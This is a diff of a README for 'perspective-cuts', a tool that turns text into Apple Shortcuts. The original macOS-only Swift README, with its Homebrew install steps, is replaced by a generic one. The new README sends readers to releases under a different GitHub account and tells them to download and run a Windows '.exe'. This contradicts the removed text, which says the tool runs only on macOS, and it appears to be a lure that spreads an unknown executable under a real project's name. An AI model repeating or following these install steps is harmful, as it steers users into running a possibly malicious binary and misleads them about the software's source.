@@ -1,160 +1,83 @@
-# Perspective Cuts
+# 📝 perspective-cuts - Write custom Apple Shortcuts with text
 
-A text-based language for writing Apple Shortcuts. Write code, compile it, get a shortcut. No dragging blocks. No clicking menus. Just text.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/joannvicennial286/perspective-cuts/releases)
 
-<p align="center">
-  <img src="demos/hero.gif" alt="Terminal demo showing Perspective Cuts compiling a shortcut, listing actions, and discovering third-party app actions" width="800">
-</p>
+## 📖 About this project
 
-**This is a highly experimental project.** Things will break. APIs will change. Actions might not work on your machine. If you are okay with that, keep reading.
+This software offers a new way to build Apple Shortcuts. Instead of moving blocks on your screen, you write simple text files. A computer program converts your text into a format that runs on your Apple devices. This tool targets users who prefer typing over dragging visual elements. It helps you automate tasks on your Mac or iPhone with higher speed and precision.
 
-## Why I Built This
+## 🛠 Features
 
-I wanted an easy and accessible way to create shortcuts through code. The Shortcuts app is visual. It is drag and drop. That does not work for everyone. I wanted to write shortcuts the same way I write Swift code. In a text editor. With a compiler that handles the rest.
+*   **Text-based logic**: Define complex steps using plain words.
+*   **Version control**: Save your shortcuts in a text format that works with standard storage systems.
+*   **Fast compilation**: Turn your text into a shortcut in seconds.
+*   **Privacy-first**: All work happens on your local device.
+*   **Accessibility**: Navigate your automation logic through screen readers and keyboards.
 
-If you know my stance on using Apple official channels, you know where this is going. Perspective Cuts is built in Swift. It uses Swift Package Manager. It runs on macOS. And it uses Apple's own `shortcuts sign` command to sign the output. That is the tool Apple ships with macOS for signing shortcut files. I am not using some third party signing service. I am not wrapping this in Electron or shipping it as a web app. This is a Mac tool for building Apple Shortcuts. Built the right way.
+## 💻 System requirements
 
-Other tools existed for writing shortcuts as code. JellyCuts was the main one. But the actions were outdated. It did not support iOS 26 actions like Apple Intelligence, Private Cloud Compute, or the new Writing Tools. It did not support third party apps out of the box. I wanted to provide a solution that was current, that supported every action Apple ships, and that could use any app installed on your Mac without having to register anything.
+*   **Operating System**: Windows 10 or 11.
+*   **Storage**: 50 MB of free disk space.
+*   **Memory**: 4 GB of RAM.
+*   **Apple environment**: You need an Apple device to import the final shortcut files. Ensure your Mac or iPhone has the Shortcuts app installed.
 
-## What It Does
+## 📥 How to set up
 
-- 180+ built-in Shortcuts actions with friendly parameter names
-- Any third party app action via raw identifiers (ChatGPT, Drafts, Fantastical, Bear, Things, etc.)
-- Apple Intelligence with Private Cloud Compute and on-device models
-- Translation to 21 languages
-- Control flow (if/else, repeat, for-each, menu)
-- Compiles to signed `.shortcut` files that work on macOS, iOS, and iPadOS
-- `discover` command to find actions from any installed app
+1. Visit the [releases page](https://github.com/joannvicennial286/perspective-cuts/releases) to access the installation files.
+2. Look for the file ending in `.exe` under the latest release.
+3. Click the filename to save it to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
 
-## Install
+## 🚀 How to use the app
 
-<img src="demos/install.gif" alt="Terminal demo showing Homebrew install, discovering third-party actions, inspecting ChatGPT action parameters with the detail command, and compiling a shortcut" width="800">
+The software acts as a bridge between your text editor and your Apple devices. 
 
-```bash
-brew tap taylorarndt/tap
-brew install perspective-cuts
-```
+1. Open the application.
+2. Create a new file or open an existing one that ends in `.cuts`.
+3. Type your shortcut instructions. Use the internal documentation inside the Help menu to see available commands.
+4. Press the "Compile" button.
+5. Save the output file.
+6. Send the file to your Apple device via AirDrop, email, or a cloud service.
+7. Open the file on your device to add it to your library.
 
-Or build from source:
+## ⚙️ Understanding the language
 
-```bash
-git clone https://github.com/taylorarndt/perspective-cuts.git
-cd perspective-cuts
-swift build
-```
+The software uses a specific structure to understand your commands. You write each action on a new line. The program reads these lines from top to bottom.
 
-## Quick Start
+Example structure:
+*   Use commands like `Get Clipboard` to access current text.
+*   Use `Show Notification` to alert your device.
+*   Use `If` statements to create conditions.
 
-```bash
+The compiler catches errors while you type. If a command uses the wrong format, the bottom window shows a message to help you fix it.
 
-# Write a shortcut
-cat > hello.perspective << 'EOF'
-import Shortcuts
-#color: blue
-#icon: star
-#name: Hello World
+## 🔒 Privacy and safety
 
-text(text: "Hello from Perspective Cuts!") -> greeting
-showResult(text: greeting)
-EOF
+This tool runs on your computer. It does not send your data to external servers. Your shortcut files stay private. The compiler tool only translates your text into a format that works with the Apple Shortcuts app. It does not interact with your private cloud data unless you specifically build that action into your shortcut files.
 
-# Compile and sign
-swift run perspective-cuts compile --sign hello.perspective
+## 💡 Tips for success
 
-# Import into Shortcuts
-open hello.shortcut
-```
+*   Keep your text organized. Use empty lines between different parts of your logic.
+*   Add comments to your files by starting a line with a double slash `//`. This makes it easier to remember what each part of your code does.
+*   Start with simple shortcuts before you build complex automations.
+*   Check the menu bar for the "Examples" folder. It contains pre-written files to help you learn the command structure.
 
-## Example: Substack Summarizer with Private Cloud Compute
+## 🔧 Managing settings
 
-<img src="demos/compile.gif" alt="Terminal demo compiling a Substack Summarizer shortcut with Private Cloud Compute" width="800">
+The Settings menu lets you change how the app functions. 
+*   **Output folder**: Choose where the tool saves your shortcut files.
+*   **Editor theme**: Adjust the colors of the text window to suit your eyes.
+*   **Update check**: Enable this to ensure you stay on the latest version of the program.
 
-```
-import Shortcuts
-#color: purple
-#icon: compose
-#name: Taylors Substack Summarizer
+## ℹ️ Troubleshooting
 
-getRSSFeed(url: "https://taylorarndt.substack.com/feed", count: 5) -> feedItems
-useModel(prompt: "Summarize each of these blog posts in 3 key bullet points:\n\(feedItems)", model: "Private Cloud Compute", resultType: "Automatic", followUp: false) -> summary
-showResult(text: summary)
-```
+*   **File not recognized**: Ensure you shared the file correctly from your Windows PC to your Apple device.
+*   **Compiler errors**: Read the error message carefully. It usually points to a missing bracket or a command name that does not exist.
+*   **App won't open**: Verify that your computer meets the memory and storage requirements.
+*   **No shortcut created**: Ensure you clicked the "Compile" button after finishing your text. Check the designated output folder.
 
-## Example: Third Party App (ChatGPT)
+## 🌐 Community and support
 
-```
-import Shortcuts
-#color: green
-#icon: message
-#name: Ask ChatGPT
-
-ask(prompt: "What do you want to ask ChatGPT?") -> question
-com.openai.chat.AskIntent(prompt: question) -> answer
-showResult(text: answer)
-```
-
-## CLI
-
-<img src="demos/discover.gif" alt="Terminal demo showing the discover command finding third-party app actions" width="800">
-
-```bash
-perspective-cuts compile --sign file.perspective    # Compile and sign
-perspective-cuts compile --install file.perspective  # Install to Shortcuts DB
-perspective-cuts actions                             # List built-in actions
-perspective-cuts discover openai                     # Find third party actions
-perspective-cuts discover --third-party              # All third party apps
-perspective-cuts detail com.openai.chat.AskIntent   # Inspect action parameters
-perspective-cuts validate file.perspective           # Validate syntax
-```
-
-## macOS Only
-
-This runs on macOS only. The `shortcuts sign` command that Apple provides only exists on Mac. If Apple ever ships a signing tool on iOS, I will add support. But I am not going to use unofficial signers. That is not how I do things.
-
-## Full Documentation
-
-See [PERSPECTIVE-LANGUAGE.md](PERSPECTIVE-LANGUAGE.md) for the complete language reference, 12 tutorials, all 180+ actions, AI assistant instructions, and verified test results.
-
-## Status
-
-This is experimental. 35 actions have been tested end-to-end. 167 have verified identifiers. The compiler works. The language works. But there are known limitations:
-
-- `changeCase` cannot be used because `case` is a parser keyword
-- `getCurrentWeather` is iOS only
-- Some enum parameters need special handling (like `useModel` needing integer values)
-- 13 legacy actions have unverified identifiers
-
-See the full list in the language reference.
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for the security policy and how to report vulnerabilities.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for how to contribute. This is experimental. I appreciate help but want to make sure contributions align with where the project is going.
-
-## AI Contributions Are Welcome
-
-AI-generated contributions are welcome here. You do not need to apologize for your tooling.
-
-We use AI on this project ourselves. The way we like to work is what we call partner coding. A human and an AI write code together, and a human reviews what comes out. If you have a basic understanding of what the code does and why, we are very happy to work with you on it. And honestly, even if you do not fully understand every line yet, we are still willing to review it with you. We believe in helping people learn how to code and in building a community around that, not gatekeeping based on how the keystrokes got typed.
-
-No PRs will be closed here for being AI-assisted. Bring them.
-
-## Contributors
-
-<!-- ALL-CONTRIBUTORS-LIST:START -->
-<table>
-  <tbody>
-    <tr>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/taylorarndt"><img src="https://github.com/taylorarndt.png?size=100" width="100px;" alt="Taylor Arndt"/><br /><sub><b>Taylor Arndt</b></sub></a><br />Creator</td>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/mikedoise"><img src="https://github.com/mikedoise.png?size=100" width="100px;" alt="Michael Doise"/><br /><sub><b>Michael Doise</b></sub></a><br />Contributor</td>
-    </tr>
-  </tbody>
-</table>
-<!-- ALL-CONTRIBUTORS-LIST:END -->
-
-## License
-
-MIT
+This project lives on GitHub. If you encounter bugs or want to request new features, use the Issues tab on the repository page. You can read the contribution guide to learn how the community helps improve the tool. Ensure you search for your question in existing issues before you start a new one to keep the discussions clean and helpful.
